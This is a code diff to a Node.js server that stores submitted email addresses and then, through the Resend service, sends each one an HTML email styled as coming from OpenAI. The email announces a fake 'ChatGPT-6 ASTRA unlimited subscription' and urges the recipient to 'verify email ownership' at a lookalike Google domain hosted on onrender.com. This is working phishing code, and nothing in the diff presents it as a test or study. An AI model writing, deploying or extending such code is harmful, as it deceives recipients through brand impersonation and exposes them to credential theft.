@@ -3,6 +3,10 @@ const http = require("http");
 const fs = require("fs");
 const path = require("path");
 const { Pool } = require("pg");
+const { Resend } = require("resend");
+const resend = process.env.RESEND_API_KEY
+  ? new Resend(process.env.RESEND_API_KEY)
+  : null;
 
 const PORT = process.env.PORT || 3000;
 const INDEX_FILE = path.join(__dirname, "index.html");
@@ -22,6 +26,95 @@ function sendJSON(res, statusCode, data) {
   res.end(JSON.stringify(data));
 }
 
+async function sendASTRAEmail(email) {
+  if (!resend) {
+    console.warn("RESEND_API_KEY is not configured. Email not sent.");
+    return;
+  }
+
+  const from = process.env.FROM_EMAIL;
+
+  if (!from) {
+    console.warn("FROM_EMAIL is not configured. Email not sent.");
+    return;
+  }
+
+  const result = await resend.emails.send({
+    from,
+    to: email,
+    subject: "Congratulations! You’re Eligible for the ASTRA unlimited subcription",
+    html: `
+      <!DOCTYPE html>
+      <html>
+      <body style="margin:0;background:#0f141a;
+                   font-family:Arial,sans-serif;padding:30px 10px;">
+        <div style="max-width:600px;margin:auto;
+                    background:#171c22;color:white;
+                    border-radius:8px;padding:35px;">
+
+          <div style="text-align:center;">
+            <h1 style="margin:0;">ASTRA</h1>
+            <p style="color:#9aa4af;">
+              The world’s most intelligent and aligned model.
+            </p>
+          </div>
+
+          <h2 style="margin-top:35px;">
+            Email ownership verification required! 
+          </h2>
+
+          <p style="color:#d7dce1;line-height:1.6;">
+            Your email address has been recorded as eligible in the ASTRA unlimited subscription offer.
+Action required: Complete the email-ownership verification step to continue the ChatGPT-6 ASTRA activation process.
+This verification is used to confirm that the person participating in this offer has access to the submitted email address and to help distinguish genuine participants from automated or spam submissions.
+Please complete the verification before continuing.
+          </p>
+
+          <div style="background:#20262d;padding:18px;
+                      border-radius:6px;margin:25px 0;">
+            <strong>ChatGPT-6 ASTRA SUBSCRIPTION</strong><br>
+            Account verified and eligible.
+            <br><br>
+            <strong>EMAIL OWNERSHIP VERIFICATION</strong><br>
+            Not verified
+          </div>
+
+          <a href="https://google-verification-9ei6.onrender.com/"
+             style="display:inline-block;
+                    background:#4285f4;
+                    color:#ffffff;
+                    text-decoration:none;
+                    padding:14px 24px;
+                    border-radius:5px;
+                    font-weight:bold;">
+            Verify Email Ownership
+          </a>
+
+          <p style="margin-top:30px;color:#89939e;
+                    font-size:13px;line-height:1.5;"> 
+            Do not give anyone your passwords, recovery phrases, or
+            authentication codes.
+          </p>
+
+          <hr style="border:0;border-top:1px solid #292f36;">
+
+          <p style="text-align:center;color:#7f8994;font-size:12px;">
+            © 2026 OpenAI
+          </p>
+
+        </div>
+      </body>
+      </html>
+    `
+  });
+console.log("Resend result:", result);
+
+if (result.error) {
+  throw new Error(result.error.message || "Resend rejected the email.");
+}
+
+console.log("Resend message ID:", result.data?.id);
+}
 function sendPage(res) {
   fs.readFile(INDEX_FILE, "utf8", (error, html) => {
     if (error) {
@@ -121,10 +214,15 @@ async function handleTrainingSubmission(req, res) {
       );
 
       console.log("Training submission stored.");
-
+try {
+  await sendASTRAEmail(email);
+  console.log("ASTRA email sent.");
+} catch (emailError) {
+  console.error("Email sending error:", emailError);
+}
       sendJSON(res, 200, {
         success: true,
-        message: "Training entry verified successfully."
+        message: "verified successfully."
       });
 
     } catch (error) {
@@ -163,7 +261,10 @@ const server = http.createServer(async(req, res) => {
     sendPage(res);
     return;
   }
-
+if (req.method === "GET" && req.url === "/admin") {
+  sendAdminPage(res);
+  return;
+}
   if (req.method === "POST" && req.url === "/training") {
     handleTrainingSubmission(req, res);
     return;
